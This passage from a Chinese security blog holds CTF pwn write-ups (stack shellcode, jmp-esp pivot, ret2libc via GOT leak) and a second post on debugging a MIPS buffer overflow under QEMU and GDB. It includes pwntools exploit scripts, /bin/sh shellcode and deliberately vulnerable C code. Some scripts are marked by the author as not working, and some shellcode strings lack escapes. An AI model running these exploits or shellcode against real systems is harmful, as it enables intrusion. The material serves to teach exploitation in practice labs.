<p><code>MSVC</code>和<code>GCC</code>在传参时的不同: </p>
<ul>
<li><code>GCC</code>编译的程序在入参时使用<code>mov</code>指令来传参,不像<code>MSVC</code>传参使用push和pop</li>
</ul>
<p><code>GCC</code>编译64位程序和32位程序入参时的不同(对比上面的题目和本题目汇编代码即可看出):</p>
<ul>
<li><code>GCC</code>编译的32位程序在入参时是直接对堆栈进行操作的</li>
<li><code>GCC</code>编译的64位程序在入参时使用<code>RDI</code>,<code>RSI</code>,<code>RDX</code>,<code>RCX</code>,<code>R8</code>,<code>R9</code>传递前六个参数</li>
</ul>
<p><code>MSVC</code>编译64位程序和32位程序入参时的不同(没有例子):</p>
<ul>
<li><code>MSVC</code>编译的32位程序直接使用push指令入栈</li>
<li><code>MSVC</code>编译的64位程序使用<code>RCX</code>,<code>RDX</code>,<code>R8</code>,<code>R9</code>传递前4个参数</li>
</ul>
</blockquote>
<p><code>IDA</code>分析程序:</p>
<p><img src="http://file.smilehacker.net/1571559310062.png" alt="IDA分析pwn5"></p>
<h3 id="确定漏洞位置"><a href="#确定漏洞位置" class="headerlink" title="确定漏洞位置"></a>确定漏洞位置</h3><p>一眼就看到了<code>read</code>函数,但是他只读了<code>0x40</code>个字节(64)字节</p>
<h3 id="确定偏移"><a href="#确定偏移" class="headerlink" title="确定偏移"></a>确定偏移</h3><p>现在很熟练了,偏移<code>0x10h</code>个字节,也就是16个字节.然后16+8=24，也就是我们在输入到24个字节是就可以覆盖返回地址</p>
<h3 id="查看可用函数"><a href="#查看可用函数" class="headerlink" title="查看可用函数"></a>查看可用函数</h3><p>看一下导入函数,发现啥也没</p>
<p><img src="http://file.smilehacker.net/1571559651228.png" alt="查看导入函数"></p>
<p>但是堆栈可以执行,我们需要直接放<code>shellcode</code>放在栈中,在这之前我们要计算一下堆栈中可以存放多少字节的<code>shellcode</code>。</p>
<blockquote>
<p>64 - 24 -8 =32 （返回地址自身的8个自己要记得计算)</p>
</blockquote>
<p><code>expoloit-db</code>上找一段下来:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 23 bytes</span><br><span class="line"># https://www.exploit-db.com/exploits/36858/</span><br><span class="line">shellcode_x64 = &quot;x31xf6x48xbbx2fx62x69x6ex2fx2fx73x68x56x53x54x5fx6ax3bx58x31xd2x0fx05&quot;</span><br></pre></td></tr></table></figure>

<p>好了,啥都有了,继续思考，怎么确定<code>payload</code>的地址?</p>
<p>那就是<code>buf</code>+32个字节,那新的问题又出来了,<code>buf</code>的地址没法确认(因为程序启用了随机化地址保护)</p>
<p>无解了。再回去看一下程序的代码，这个<code>printf</code>函数干了什么。它把<code>buf</code>的地址给打印出来了:sweat:</p>
<p>妙啊~</p>
<p>然后整理一下，看缓冲区怎么布置</p>
<p><img src="http://file.smilehacker.net/1571560805846.png" alt="缓冲区布置"></p>
<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./pwn5'</span>)</span><br><span class="line"><span class="comment"># 23 bytes</span></span><br><span class="line"><span class="comment"># https://www.exploit-db.com/exploits/36858/</span></span><br><span class="line">shellcode_x64 = <span class="string">"x31xf6x48xbbx2fx62x69x6ex2fx2fx73x68x56x53x54x5fx6ax3bx58x31xd2x0fx05"</span></span><br><span class="line">sh.recvuntil(<span class="string">'['</span>)</span><br><span class="line">buf_addr = sh.recvuntil(<span class="string">']'</span>, drop=<span class="literal">True</span>)</span><br><span class="line">buf_addr = int(buf_addr, <span class="number">16</span>)</span><br><span class="line">payload = <span class="string">'b'</span> * <span class="number">24</span> + p64(buf_addr + <span class="number">32</span>) + shellcode_x64</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line">~</span><br></pre></td></tr></table></figure>

<p>参考一下就好,代码并不能运行。没有细看过<code>pwntools</code>模块,也就不做调试了。</p>
<h2 id="六"><a href="#六" class="headerlink" title="六"></a>六</h2><p>下载地址:<a href="https://github.com/smile0304/pwn_execrise/raw/master/pwn_basic_rop_2/pwn6" target="_blank" rel="noopener">pwn</a></p>
<p><code>checksec</code>检查程序:</p>
<p><img src="http://file.smilehacker.net/1571561335922.png" alt="checksec检查pwn6"></p>
<p>啥也没开,别激动,不好搞。</p>
<p>IDA查看代码:</p>
<p><img src="http://file.smilehacker.net/1571561531179.png" alt="IDA分析pwn6"></p>
<h3 id="确认漏洞"><a href="#确认漏洞" class="headerlink" title="确认漏洞"></a>确认漏洞</h3><p>一眼就看到<code>gets</code>函数了,但是空间只有<code>0x32</code>即50字节</p>
<h3 id="计算偏移"><a href="#计算偏移" class="headerlink" title="计算偏移"></a>计算偏移</h3><p>现在计算很快了,0x20 + 4 = 0x24 = 32个字节,即淹没32字节即可淹没返回地址</p>
<h3 id="导入函数表"><a href="#导入函数表" class="headerlink" title="导入函数表"></a>导入函数表</h3><p>不截图了, 没有<code>system</code>函数</p>
<h3 id="思考（想不通就配合下面的图片）"><a href="#思考（想不通就配合下面的图片）" class="headerlink" title="思考（想不通就配合下面的图片）"></a>思考（想不通就配合下面的图片）</h3><p>现在没招了,用<code>shellcode</code>? 看看现在的空间50-36-4=10，谁有10字节的<code>shellcode</code>赶紧拿出来。</p>
<p>溢出时没得想了，但是我们可以考虑把<code>shellcode</code>作为正常的参数传入栈中,而且栈也是有可执行权限的(没有启用<code>NX</code>)，这样,我们就有36个字节用来存放<code>shellcode</code>了。找到了新思路，我们需要思考两个问题</p>
<ol>
<li>如何找到<code>shellcode</code>起始地址</li>
<li>如何跳转到<code>sellcode</code>的起始地址</li>
</ol>
<p>先解决第一个问题</p>
<p> 漏洞函数产生的位置是在<code>vul</code>函数中,当<code>vul</code>函数执行完成后返回<code>main</code>函数栈帧,我们可以倒推回<code>s</code>的起始位置，即</p>
<blockquote>
<p>esp - 0x20(s的长度) -0x4(vul的返回地址) - 0x4(vul函数的ebp)=0x28</p>
</blockquote>
<p>所以,我们已经推算处<code>shellcode</code>的位置。</p>
<p>解决第二个问题</p>
<p>在函数的返回地址，我们需要一段指令让程序可以跳转到跳转到<code>esp</code>,这样才能继续执行栈帧上的代码:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary stack_pivoting_1 --only 'jmp|ret' | grep 'esp'</span><br></pre></td></tr></table></figure>

<p><img src="http://file.smilehacker.net/1571571949860.png" alt="寻找jmp esp"></p>
<p>继续回到栈帧执行代码,我们在栈帧之后布置如下指令.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sub esp 0x28; </span><br><span class="line">jmp esp;</span><br></pre></td></tr></table></figure>

<p><code>shellcode</code>得到执行。</p>
<p>看一下当前栈帧的布局:</p>
<p><img src="http://file.smilehacker.net/1571572971883.png" alt="当前栈帧布局"></p>
<p>仔细想想,不太好懂。</p>
<h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./pwn6'</span>)</span><br><span class="line"></span><br><span class="line">shellcode_x86 = <span class="string">"x31xc9xf7xe1x51x68x2fx2fx73"</span></span><br><span class="line">shellcode_x86 += <span class="string">"x68x68x2fx62x69x6ex89xe3xb0"</span></span><br><span class="line">shellcode_x86 += <span class="string">"x0bxcdx80"</span></span><br><span class="line"></span><br><span class="line">sub_esp_jmp = asm(<span class="string">'sub esp, 0x28;jmp esp'</span>)</span><br><span class="line">jmp_esp = <span class="number">0x08048504</span></span><br><span class="line">payload = shellcode_x86 + (</span><br><span class="line">    <span class="number">0x20</span> - len(shellcode_x86)) * <span class="string">'b'</span> + <span class="string">'bbbb'</span> + p32(jmp_esp) + sub_esp_jmp</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>没办法成功执行,换了个<code>x86</code>平台的shell，我感觉这个<code>shellcode</code>有问题！！</p>
<h2 id="七"><a href="#七" class="headerlink" title="七"></a>七</h2><p>下载地址: <a href="https://github.com/smile0304/pwn_execrise/raw/master/pwn_basic_rop_2/pwn7" target="_blank" rel="noopener">pwn7</a></p>
<p>上来还老规矩,使用<code>checksec</code>检查程序保护情况:</p>
<p><img src="http://file.smilehacker.net/1572240054879.png" alt="checksec检查pwn7"></p>
<p>只开启了<code>DEP</code>保护。<code>IDA</code>查看掠过，漏洞函数还是一样的，但是没有导入函数,没有合适的<code>Gadget</code>语句。怎么办？</p>
<p>劫持<code>GOT</code></p>
<h3 id="Hijack-GOT"><a href="#Hijack-GOT" class="headerlink" title="Hijack GOT"></a>Hijack GOT</h3><blockquote>
<p>修改某个被调用函数的地址，让其指向另一个函数。</p>
<p>example : 修改<code>printf()</code>函数的地址使其指向<code>system()</code>函数</p>
</blockquote>
<p>要实现上述过程，我们就需要理解一下函数调用时，程序是怎么找到被<code>调用函数</code>的？</p>
<p>程序在对外部的函数调用时需要在生成可执行文件时包含“外部函数的链接”到程序中,链接的方式分为两种：</p>
<ul>
<li>静态链接: 静态链接生成的可执行文件包含外部函数的全部代码</li>
<li>动态链接: 动态链接生成的可执行文件不包含外部函数的代码，而是运行时将，动态链接库（若干外部函数的集合）加载到内存的某个位置，在发生函数调用时去链接库定位所需的函数。 </li>
</ul>
<p>那就出现了一个新的问题。程序如何在链接库内定位到所需函数？这个过程用到两张表<code>GOT</code>和<code>PLT</code></p>
<ul>
<li><code>GOT</code>：全局偏移量表(<strong>G</strong>lobal <strong>O</strong>ffset <strong>T</strong>able)， 用来存储外部函数在内存的确切地址。<ul>
<li><code>GOT</code>存储在数据段中(<code>Data Segment</code>)，<strong>可以在程序运行时被修改</strong></li>
</ul>
</li>
<li><code>GIT</code>：程序链接表(<strong>P</strong>rocedure <strong>L</strong>inkage <strong>T</strong>able)，用来存储外部函数的入口点。程序运行时到<code>PLT</code>表中寻找外部函数的地址。<ul>
<li><code>PLT</code>存储在代码段(Code Segment)内，在运行之前就已经确定并且不会被修改，所以<code>PLT</code> 并不会知道程序运行时动态链接库被加载的确切位置。 </li>
</ul>
</li>
</ul>
<p>那么<code>PLT</code>表内存储的入口点是什么?</p>
<ul>
<li><p>存储的是<code>GOT</code>表中对应条数的地址</p>
<p><img src="http://file.smilehacker.net/1572242662913.png" alt="PLT存储"></p>
</li>
</ul>
<p>既然外部函数地址都存放在<code>GOT</code>中,而不是<code>PLT</code>，<code>PLT</code>存储的入口点又指向<code>GOT</code>的对应条目，那程序为什么选在<code>PLT</code>作为函数的入口点，而不是<code>GOT</code>? 在程序启动时确定所有外部函数的内存地址并写入<code>GOT</code>表，之后只使用<code>GOT</code>表不是更方便吗？ </p>
<ul>
<li>这样设计的目的是因为效率。</li>
</ul>
<p><code>GOT</code>表的<strong>初始值</strong>都指向<code>PLT</code>表对应条目中的某个片段，这个片段的作用是调用一个函数地址解析函数。</p>
<p>当程序需要调用某个外部函数时，过程如下</p>
<ul>
<li>首先到<code>PLT</code>表内寻找对应的入口点，跳转到<code>GOT</code>表中。</li>
<li>第一次调用这个函数：<ul>
<li>程序会通过<code>GOT</code>表再次跳转回<code>PLT</code>表，运行地址解析程序来确定函数的确切地址，并用其覆盖掉<code>GOT</code>表的初始值，之后再执行函数调用,</li>
</ul>
</li>
<li>不是第一次调用(再次调用)：<ul>
<li>程序仍然首先通过<code>PLT</code>表跳转到<code>GOT</code>表，此时<code>GOT</code>表已经存有获取函数的内存地址，所以会直接跳转到函数所在地址执行函数。</li>
</ul>
</li>
</ul>
<p>第一次调用的示意图:</p>
<p> <img src="http://file.smilehacker.net/v2-b78288c5eb8bfd2568728f34fbbb0e9e_hd.png" alt="第一次调用"> </p>
<p>不是第一次调用的示意图:</p>
<p> <img src="http://file.smilehacker.net/v2-caa5320d0bb0101edad4b9127f6fe413_hd.png" alt="不是第一次调用"></p>
<p>上面的这个过程采用了<code>LAZY</code>设计思想, 它将需要完成的操作(解析外部函数的内存地址)留到调用实际发生时才进行，而非在程序一开始运行时就解析出全部函数地址。跟<code>python</code>中的生成器有点像，懒加载</p>
<p>这个过程也启示了我们如何实现函数的伪装，那就是到<code>GOT</code>表中将函数<code>A</code>的地址修改为函数<code>B</code>的地址。这样在后面所有对函数<code>A</code>的调用都会执行函数<code>B</code>。我们可以将目标分解成以下几个步骤:</p>
<ul>
<li>确定函数<code>A</code>在<code>GOT</code>表中的条目位置 </li>
<li>确定函数<code>B</code>在内存中的地址 </li>
<li>将函数<code>B</code>的地址写入函数<code>A</code>在<code>GOT</code>表中的条目</li>
</ul>
<p>第一个问题，如何确认函数<code>A</code>在<code>GOT</code>表中的位置?</p>
<p>这个问题好说，程序调用函数时是通过<code>PLT</code>表跳转到 GOT 表的对应条目，所以可以在函数调用的汇编指令中找到<code>PLT</code>表中该函数的入口点位置，从而定位到该函数在<code>GOT</code>中的条目。 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">call 0x08048430 &lt;printf@plt&gt;</span><br></pre></td></tr></table></figure>

<p>就说明<code>printf</code>在<code>PLT</code>表中的入口点是在 <em>0x08048430*，所以 *0x08048430</em> 处存储的就是<code>GOT</code>表中<code>printf</code>的条目地址。 </p>
<p>第二个问题， 如何确定函数 B 在内存中的地址？ </p>
<p>如果开启了<code>ASLR</code>，程序每次动态加载的位置都是随机的，就很难直接定位函数位置。假如函数<code>B</code>已经调用过了，我们通过上一个问题的答案来拿到结果，但是，我们想要的函数系统一般又不会调用，<code>GOT</code>表中并没有相应的记录。那怎么办? 幸运的是，函数在动态链接库内的相对位置是固定的，在动态库打包生成时就已经确定。所以假如我们知道了函数<code>A</code>的运行时地址（读取<code>GOT</code>表内容），也知道函数<code>A</code>和函数<code>B</code>在动态链接库内的相对位置，就可以推算出函数<code>B</code>的运行时地址。 </p>
<p>最后，如何实现 GOT 表中数据的修改？ </p>
<p><code>ROP</code>,不多说了</p>
<p>从上面也可以看出，修改<code>GOT</code>表也可以在一定程度上绕过<code>ASLR</code></p>
<h3 id="回到题目"><a href="#回到题目" class="headerlink" title="回到题目"></a>回到题目</h3><p>看了上面的分析，应该是有个大概的思路了。这里的思路并不是修改某个函数的<code>got</code>记录，而是根据偏移计算出<code>system</code>的地址</p>
<p>先来想第一个问题，如何拿到<code>system</code>函数的地址?我们需要记住两点`</p>
<ul>
<li><code>system</code>函数属于<code>libc</code>，而<code>libc.so</code>动态链接库中的函数之间相对偏移是固定的。</li>
<li>即使程序有<code>ASLR</code>保护，也只是针对于地址中间位进行随机，最低的12位并不会发生改变。而<code>libc</code>在<code>github</code>上有人进行收集。<a href="https://github.com/niklasb/libc-database" target="_blank" rel="noopener">libc</a></li>
</ul>
<p>所以如果我们知道<code>libc</code>中某个函数的地址，那么我们就可以确定该程序利用的<code>libc</code>。进而我们就可以知道 <code>system</code>函数的地址。 </p>
<p>那么如何得到<code>libc</code>中的某个函数的地址呢？我们一般常用的方法是采用<code>got</code>表泄露，即输出某个函数对应的<code>got</code>表项的内容。<strong>当然，由于<code>libc</code>的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。</strong> 根据上述方法找到<code>libc</code>之后查询偏移，获取<code>system</code>地址,手动操作有点复杂，而且<code>github</code>有个现成的<a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener">利用工具</a></p>
<p>此外，在得到<code>libc</code>之后，其实<code>libc</code>中也是有 /bin/sh 字符串的，所以我们可以一起获得<code>/bin/sh</code>字符串的地址。 </p>
<p>这里我们泄露<code>puts</code>的地址。基本利用思路如下:</p>
<ul>
<li>泄露<code>puts</code>地址</li>
<li>获取<code>libc</code>版本</li>
<li>获取<code>system</code>地址与<code>/bin/sh</code>的地址</li>
<li>再次执行源程序(<code>puts</code>函数的回调，直接指向漏洞点)</li>
<li>触发栈溢出执行<code>system(‘/bin/sh’)</code></li>
</ul>
<p>整理的<code>EXP</code>如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">sh = process(<span class="string">'./pwn7'</span>)</span><br><span class="line"></span><br><span class="line">ret2libc3 = ELF(<span class="string">'./pwn7'</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = ret2libc3.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = ret2libc3.got[<span class="string">'puts'</span>]</span><br><span class="line">main = ret2libc3.symbols[<span class="string">'main'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"leak puts_got addr and return to main again"</span></span><br><span class="line">payload = flat([<span class="string">'A'</span> * <span class="number">112</span>, puts_plt, main, puts_got])</span><br><span class="line">sh.sendlineafter(<span class="string">'Can you find it !?'</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"get the related addr"</span></span><br><span class="line">puts_addr = u32(sh.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>, puts_addr)</span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"get shell"</span></span><br><span class="line">payload = flat([<span class="string">'A'</span> * <span class="number">104</span>, system_addr, <span class="number">0xdeadbeef</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="GET-SHELL"><a href="#GET-SHELL" class="headerlink" title="GET SHELL"></a>GET SHELL</h3><p><img src="http://file.smilehacker.net/1572270342624.png" alt="成功获取shell"></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://www.anquanke.com/post/id/164530" target="_blank" rel="noopener">https://www.anquanke.com/post/id/164530</a></li>
<li><a href="https://www.anquanke.com/post/id/168468" target="_blank" rel="noopener">https://www.anquanke.com/post/id/168468</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/25892385" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/25892385</a></li>
<li><a href="https://sp4n9x.github.io/2018/05/10/一步一步学ROP之Linux_x86篇-蒸米/" target="_blank" rel="noopener">一步一步学ROP之Linux_x86篇-蒸米</a> </li>
</ul>
]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
        <tag>CTF</tag>
        <tag>ROP</tag>
      </tags>
  </entry>
  <entry>
    <title>使用GDB调试MIPS架构的缓冲区溢出</title>
    <url>/post/43075.html</url>
    <content><![CDATA[<h4 id="使用GDB调试MIPS架构的缓冲区溢出"><a href="#使用GDB调试MIPS架构的缓冲区溢出" class="headerlink" title="使用GDB调试MIPS架构的缓冲区溢出"></a>使用GDB调试MIPS架构的缓冲区溢出</h4><h4 id="环境介绍和准备工作"><a href="#环境介绍和准备工作" class="headerlink" title="环境介绍和准备工作"></a>环境介绍和准备工作</h4><p>测试的代码都是来自&lt;&lt;解密家用路由器0day挖掘技术&gt;&gt;一书,书上的调试使用的是QEMU + IDA来动态调试,由于最近在学习GDB的调试，所以尝试用QEMU + GDB来调试,权当练手了。</p>
<p>测试使用的代码(下面代码中存在明显的缓冲区溢出漏洞)：</p>
<a id="more"></a>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_system</span><span class="params">(<span class="keyword">int</span> code, <span class="keyword">char</span> *cmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">255</span>];</span><br><span class="line">    <span class="comment">//sleep(1);</span></span><br><span class="line">    system(cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> fileLen = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">fileData</span>;</span></span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">0</span> == stat(<span class="string">"passwd"</span>, &amp;fileData))</span><br><span class="line">        fileLen = fileData.st_size;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ((fp = fopen(<span class="string">"passwd"</span>, <span class="string">"rb"</span>)) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Cannot open file passwd! \n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ch = fgetc(fp);</span><br><span class="line">    <span class="keyword">while</span>(count &lt;= fileLen)&#123;</span><br><span class="line">        buf[count++] = ch;</span><br><span class="line">        ch = fgetc(fp);</span><br><span class="line">    &#125;</span><br><span class="line">    buf[--count] = '\x00';</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(buf, <span class="string">"adminpwd"</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        do_system(count, <span class="string">"ls -l"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"you have an invalid password!\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用mipsls-linux-gcc来编译程序</p>
<blockquote>
<p>mipsel-linux-gcc -g crash.c -static -o vuln_system</p>
</blockquote>
<ul>
<li>-g 生成的可执行文件才能用gdb进行源码级调试</li>
<li>-o 输出文件的名称</li>
<li>-static 静态编译</li>
</ul>
<p>编译完成后可尝试使用<code>qemu-mipsel</code>验证程序正确性<br><img src="http://file.smilehacker.net/info_1.png" alt="环境介绍"></p>
<p>从上面图片可以看出,编译产生的程序为一个MIPS程序,在Linux下无法直接运行,生成<code>passwd</code>文件(一个正常的输入文件，并没有造成溢出),使用<code>qemu-mipsel</code>模拟程序获得执行结果。</p>
<h4 id="使用GDB动态调试程序"><a href="#使用GDB动态调试程序" class="headerlink" title="使用GDB动态调试程序"></a>使用<code>GDB</code>动态调试程序</h4><p>启动<code>qemu</code>远程调试</p>
<blockquote>
<p>qemu-mipsel -g 1234 vuln_system</p>
</blockquote>
<ul>
<li>-g 指定<code>qemu-mipsel</code>远程调试端口</li>
</ul>
<p>设置<code>gdb</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb-multiarch ./vuln_system</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 打开gdb后进行如下设置</span></span><br><span class="line"></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> <span class="built_in">set</span> endian little <span class="comment">#设置小端序</span></span></span><br><span class="line">The target is assumed to be little endian</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> <span class="built_in">set</span> architecture mips <span class="comment">#设置为Mips架构</span></span></span><br><span class="line">The target architecture is assumed to be mips</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> target remote localhost:1234 <span class="comment">#设置远程端口</span></span></span><br></pre></td></tr></table></figure>
<p><img src="http://file.smilehacker.net/Gdbset.png" alt="GDB调试设置"></p>
<p>现在重新生成<code>passwd</code>文件,使用python向文件中写入600个A</p>
<blockquote>
<p>python -c “print ‘A’*600 “&gt; passwd</p>
</blockquote>
<p>之后重新用gdb加载程序,直接输入<code>r</code>让程序直接运行。</p>
<p><img src="http://file.smilehacker.net/info2.png" alt="Alt text"></p>
<p>可以看到程序直接崩溃，并且崩溃后的<code>PC</code>寄存器指向了<code>0x41414141</code>(A的16进制为0x41)</p>
<h4 id="劫持执行流程"><a href="#劫持执行流程" class="headerlink" title="劫持执行流程"></a>劫持执行流程</h4><p>从上面可以看到,不仅程序崩溃了,而且完全劫持了函数流程,让<code>PC</code>指针指向0x41414141,现在尝试精准定位，究竟淹没多少个自己可以劫持程序的执行流程。</p>
<h5 id="计算偏移"><a href="#计算偏移" class="headerlink" title="计算偏移"></a>计算偏移</h5><p>通过静态分析发现,如果要使缓冲区溢出,并控制到堆栈中的返回地址saved_ra,需要覆盖的数据大小应该达到0x1A0-0x04即0x19c字节;作者这里运用这个公式的依据是什么呢?让我们回顾一下X86架构下的情形:</p>
<p>偏移不就是找buf和ra之间的偏移么,ra是存储于栈里面的(有点类似于x86里面的ret指令),buf指向栈里面,只要计算出buf的初始位置和ra之间的偏移,就可以计算出有多少个字节就可以溢出到ra了！</p>
<h5 id="寻找偏移"><a href="#寻找偏移" class="headerlink" title="寻找偏移"></a>寻找偏移</h5><p><img src="http://file.smilehacker.net/findoffest.png" alt="寻找偏移"></p>
<figure class="highlight mips"><table><tr><td class="code"><pre><span class="line">addiu   $sp, -0x1D0            //sp &lt;==sp-0x1D0</span><br><span class="line">sw      $ra, 0x1D0+var_4($sp)  //将ra里面的值存放于堆栈里面,其偏移值为											0x1D0+var_4</span><br><span class="line">sw      $fp, 0x1D0+var_8($sp)  //将fp里面的值存放于堆栈里面,其偏移为0x1D0+var_8</span><br><span class="line">move    $fp, $sp                //fp&lt;== sp</span><br><span class="line">li      $gp, 0x4291A0           //li指令:将一个立即数存放于寄存器里面</span><br><span class="line">sw      $gp, 0x1D0+var_1C0($sp) //将gp里面的值存放于堆栈里面,其偏移为										0x1D0+var_1C0</span><br><span class="line">addiu   $v0, $fp, 0x1D0+var_1A0    //v0用于存放函数函数返回值</span><br><span class="line">li      $v1, 0x100        //将立即数0x100传入v1</span><br><span class="line">move    $a2, $v1          //MIPS架构中一般使用a0-a3作为函数的前4个参数</span><br><span class="line">move    $a1, $zero        //zero寄存器里面永远为0</span><br><span class="line">move    $a0, $v0          //a0=v0</span><br><span class="line">la      $v0, memset      //复制memset地址至至v0中</span><br><span class="line">move    $t9, $v0         //$t0-$t9供汇编程序使用的临时变量</span><br><span class="line">bal     memset           //无条件转移,并且将转移指令后面的第二条地址作为返回值存放								于Ra里面</span><br><span class="line"><span class="keyword">nop</span></span><br></pre></td></tr></table></figure>

<p>结合源代码看,可以发现主函数里面调用的第一个函数为<code>memset</code>函数,但是源代码中没有调用这个函数,发现在调用这个函数之前是调用了3个参数的,分别用到<code>a0</code>,<code>a1</code>,和<code>a2</code>这几个寄存器,而函数<code>memset</code>的原型为<code>void* memset(void* s,int ch,unsigned n)</code>，其主要功能为:在内存空间里以s为起始的地方,将开始的n个字节设为指定值;可以发现传给<code>a2</code>的值为<code>v1</code>,而传给<code>$v1</code>的为<code>0x100</code>(0x100实际上就是十进制256),这里在做的事情是内存初始化,通过这个函数将内存里面的<code>256</code>个字节初始化为<code>0</code>,而这里的内存初始地址是通过指令<code>addiu $v0,$fp,0x1D0+var_1A0</code>来确定的,显然,<code>0x1D0+var_1A0</code>就是我们要找的buf的起始偏移，到这里,我们才能确定:需要覆盖的数据大小应该为<code>0x1D0+var_1A0-0x1D0-var_4</code>即<code>0x19c</code>字节;</p>
<h5 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h5><p>我们将0x19C以后的数据设置成<code>BBBB</code>(0x42424242),如果我们猜测正确,那程序会被劫持到0x424242处</p>
<blockquote>
<p>tt@ubuntu:~$ python -c “print ‘A’*0x19c + ‘BBBB’+’CCCC’”&gt;passwd</p>
</blockquote>
<p>接下来使用GDB查看main函数的代码，并在main函数结尾处下断点</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">disassemble main # 查看main函数的汇编代码</span><br><span class="line"></span><br><span class="line">break *main+740 # 在main函数后740行处下断点</span><br></pre></td></tr></table></figure>

<p><img src="http://file.smilehacker.net/gccbreaks.png" alt="汇编下断点"></p>
<p>断点下好后输入<code>c</code>,让程序运行到刚刚下的断点处</p>
<p><img src="http://file.smilehacker.net/return.png" alt="继续运行"></p>
<p>输入<code>n</code>,让函数运行到756行，如果<code>ra</code>被替换成<code>0x42424242</code>,就说明我们的猜想是正确的。</p>
<p><img src="http://file.smilehacker.net/validate.png" alt="猜想成功"></p>
<p>可以看到pc的值已经成功被劫持为<code>0x42424242</code>了</p>
